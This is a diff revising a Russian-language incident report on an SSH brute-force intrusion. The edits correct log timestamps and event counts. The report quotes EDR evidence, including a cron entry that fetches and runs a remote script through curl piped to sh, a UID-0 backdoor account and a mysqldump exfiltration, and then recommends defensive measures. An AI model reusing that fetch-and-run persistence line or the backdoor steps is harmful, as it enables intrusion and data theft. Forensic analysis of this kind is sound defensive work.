@@ -29,7 +29,7 @@
 2016-12-13T21:05:00 | Auth | ssh_login_failed | deploy | 203.0.113.77 | SSH login failed
 2016-12-13T21:05:03 | Auth | ssh_login_failed | deploy | 203.0.113.77 | SSH login failed
 2016-12-13T21:05:07 | Auth | ssh_login_failed | deploy | 203.0.113.77 | SSH login failed
-... (всего 38 попыток)
+... (всего 287 попыток)
 ```
 **Ключевой момент взлома – успешный вход:**
 ```
@@ -39,7 +39,7 @@
 EDR также фиксирует интерактивную SSH-сессию:
 
 ```
-2016-12-13T21:27:1	"EDR"	"logon"	"deploy"	"-"	"interactive SSH session" LOW
+2016-12-13T21:27:14 | EDR | logon | deploy | - | interactive SSH session LOW
 
 ```
 ### Этап 3: Закрепление внутри системы и создание бэкдора (13 декабря 2016, 21:28:00 – 21:30:00)
@@ -52,25 +52,24 @@ EDR также фиксирует интерактивную SSH-сессию:
 ```
 2016-12-13T21:28:06	Auth	sudo_command	TTY=pts/0		COMMAND=/usr/bin/id LOW
 ```
-2. **Создание новых пользователей (CRITICAL):**
+2. **Создание нового пользователя (CRITICAL):**
 ```
-2016-12-13T21:28:37 | Auth | user_created | TTY=pts/0 | New user created (CRITICAL)
 2016-12-13T21:28:37 | Auth | user_created | TTY=pts/0 | New user created (CRITICAL)
 ```
 
-EDR уточняет, что один из созданных пользователей — `svc-backup` с UID 0 (root-эквивалент):
+EDR уточняет, что из созданный пользователь — `svc-backup` с UID 0 (root-эквивалент):
 ```
-2016-12-13T21:28:3 | EDR | "account_created" | "svc-backup" | "-" | "new account created with UID 0 (root equivalent)
+2016-12-13T21:28:37 | EDR | account_created | svc-backup | - | new account created with UID 0 (root equivalent)
 ```
 
 3. **Добавление SSH-ключа для root-учетной записи:**
 ```
-2016-12-13T21:29:3 | EDR | "file_write" | "root" | "-" | "SSH public key added for UID-0 account
+2016-12-13T21:29:39 | EDR | file_write | root | - | SSH public key added for UID-0 account
 ```
 
 4. **Добавление задачи в cron для периодического запуска вредоносного скрипта:**
 ```
-2016-12-13T21:30:0 | EDR | "file_write" | "root" | "-" | "cron entry: */30 * * * * root curl -fsSL http://198.51.100.23/p.sh | sh
+2016-12-13T21:30:05 | EDR | file_write | root | - | cron entry: */30 * * * * root curl -fsSL http://198.51.100.23/p.sh | sh
 ```
 
 ### Этап 4: Эксфильтрация данных и заметание следов (13–14 декабря 2016)
@@ -81,7 +80,7 @@ EDR уточняет, что один из созданных пользоват
 
 1. **Вход под учетной записью svc-backup:**
 ```
-2016-12-14T02:04:5 | EDR | "logon" | "svc-backup" | "-" | "UID-0 account logon via key
+2016-12-14T02:04:55 | EDR | logon | svc-backup | - | UID-0 account logon via key
 ```
 
 2. **Дамп всех баз данных:**
@@ -91,25 +90,25 @@ EDR уточняет, что один из созданных пользоват
 
 3. **Создание архива с дампом (1.85 ГБ) в скрытой временной директории:**
 ```
-2016-12-14T02:10:4 | EDR | "file_write" | "root" | "-" | "1.85 GB archive in hidden tmp dir
+2016-12-14T02:10:44 | EDR | file_write | root | - | 1.85 GB archive in hidden tmp dir
 ```
 
 4. **Передача архива на внешний сервер (серия событий):**
 ```
-"2016-12-14T02:11:5 | EDR | "network_egress" | "root" | "-" | "large outbound transfer to unrecognised host"
-"2016-12-14T02:12:2 | EDR | "network_egress" | "root" | "-" | "large outbound transfer to unrecognised host"
-"2016-12-14T02:12:5 | EDR | "network_egress" | "root" | "-" | "large outbound transfer to unrecognised host"
-... (всего 10 событий)
+2016-12-14T02:11:52 | EDR | network_egress | root | - | large outbound transfer to unrecognised host
+2016-12-14T02:12:22 | EDR | network_egress | root | - | large outbound transfer to unrecognised host
+2016-12-14T02:12:59 | EDR | network_egress | root | - | large outbound transfer to unrecognised host
+... (всего 9 событий)
 ```
 
 5. **Удаление архива после передачи:**
 ```
-2016-12-14T02:17:3 | EDR | "file_delete" | "root" | "-" | "staging archive removed after transfer
+2016-12-14T02:17:37 | EDR | file_delete | root | - | staging archive removed after transfer
 ```
 
 6. **Обрезание логов входа для сокрытия следов:**
 ```
-2016-12-14T02:17:4 | EDR | "file_truncate" | "root" | "-" | "login history truncated
+2016-12-14T02:17:49 | EDR | file_truncate | root | - | login history truncated
 ```
 
 
@@ -132,7 +131,7 @@ EDR уточняет, что один из созданных пользоват
 
 1. **Интенсивный брутфорс:** За 2 дня до успешного входа наблюдается огромное количество событий `ssh_invalid_user` с множества IP-адресов — классический признак распределенного брутфорса.
 
-2. **Целевая атака на конкретного пользователя:** В день взлома (13 декабря) в 21:05 начинается серия из **38 неудачных попыток** входа под пользователем `deploy` с одного IP-адреса `203.0.113.77`. Частота попыток указывает на использование словаря паролей.
+2. **Целевая атака на конкретного пользователя:** В день взлома (13 декабря) в 21:05 начинается серия из **287 неудачных попыток** входа под пользователем `deploy` с одного IP-адреса `203.0.113.77`. Частота попыток указывает на использование словаря паролей.
 
 Доказательства представлены ранее в анализировании цепочки событий
 
@@ -163,7 +162,7 @@ EDR уточняет, что один из созданных пользоват
 |----------|---------------|
 | Выполнение дампа всех баз данных | `2016-12-14T02:10:03 | Auth | sudo_command | TTY=pts/1 | COMMAND=/usr/bin/mysqldump --all-databases` |
 | Создание архива с дампом (1.85 ГБ) в скрытой директории | `"2016-12-14T02:10:4 | EDR | "file_write" | "root" | "-" | "1.85 GB archive in hidden tmp dir"` |
-| Передача архива на внешний сервер | 10 событий `"network_egress"` с пометкой `"large outbound transfer to unrecognised host"` |
+| Передача архива на внешний сервер | 9 событий `"network_egress"` с пометкой `"large outbound transfer to unrecognised host"` |
 
 ### 3.3. Замел следы
 
@@ -270,12 +269,12 @@ EDR уточняет, что один из созданных пользоват
 ### Мера 1. Внедрить двухфакторную аутентификацию (MFA) для SSH
 Настроить Google Authenticator, PAM-модуль на всех серверах с публичным SSH-доступом. Без TOTP-кода вход невозможен даже при правильном пароле. Это делает брутфорс бесполезным.
 
-**Обоснование:**  Злоумышленник получил доступ методом брутфорса (38 неудачных попыток, затем успешный вход).
+**Обоснование:**  Злоумышленник получил доступ методом брутфорса (287 неудачных попыток, затем успешный вход).
 
 ### Мера 2. Настроить автоматическую блокировку IP после неудачных попыток
 Развернуть Fail2ban на всех серверах с настройками: блокировка IP после 3 неудачных попыток входа за 5 минут на 24 часа. Доверенные IP (офис, VPN) добавить в белый список.
 
-**Обоснование:** 38 неудачных попыток с одного IP за 20 минут - блокировка наступила бы после 3-й попытки.
+**Обоснование:** 287 неудачных попыток с одного IP за 20 минут - блокировка наступила бы после 3-й попытки.
 
 ### Мера 3. Настроить мониторинг критических изменений системы
 Развернуть Osquery на всех серверах с проверкой каждую минуту: создание учетных записей с UID 0, добавление SSH-ключей в authorized_keys, изменение файлов в /etc/cron*. При обнаружении — отправка алерта в SIEM или на почту.
